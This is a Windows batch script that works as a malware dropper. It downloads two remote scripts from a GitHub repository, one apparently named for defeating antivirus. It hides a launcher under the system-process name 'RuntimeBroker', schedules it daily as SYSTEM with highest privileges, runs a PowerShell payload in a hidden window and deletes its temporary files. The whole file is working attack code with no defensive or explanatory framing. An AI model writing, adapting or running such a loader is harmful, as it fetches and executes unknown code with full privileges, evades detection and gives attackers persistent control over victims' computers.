@echo off
setlocal

:: Define the URLs for the batch script and PowerShell PS1 script
set "batchFileUrl=https://raw.githubusercontent.com/partymonster2/Batch-Scripts/main/Defeater_Downloader.bat"
set "ps1FileUrl=https://raw.githubusercontent.com/partymonster2/Batch-Scripts/main/CSPS1PL.ps1"

:: Create a temporary directory to store the downloaded files
set "tempDir=%TEMP%\MWDD"
mkdir "%tempDir%"

:: Download the batch script
powershell -command "(New-Object Net.WebClient).DownloadFile('%batchFileUrl%', '%tempDir%\Defeater_Downloader.bat')"

:: Create a new batch file (RuntimeBroker.bat) to run Defeater_Downloader.bat invisibly
echo @echo off > "%tempDir%\RuntimeBroker.bat"
echo start /min "" cmd /c "Defeater_Downloader.bat" >> "%tempDir%\RuntimeBroker.bat"

:: Create a scheduled task to run RuntimeBroker.bat silently
schtasks /create /tn "RuntimeBroker Task" /tr "%tempDir%\RuntimeBroker.bat" /sc daily /st 00:00 /ru SYSTEM /rl highest /f

:: Wait for the batch script to finish (adjust the timeout as needed)
timeout /t 1

:: Download the PowerShell PS1 script
powershell -command "(New-Object Net.WebClient).DownloadFile('%ps1FileUrl%', '%tempDir%\CSPS1PL.ps1')"

:: Run the PowerShell PS1 script invisibly
powershell -windowstyle hidden -file "%tempDir%\CSPS1PL.ps1"

:: Clean up: Delete the temporary directory
rmdir /s /q "%tempDir%"

:: End of script
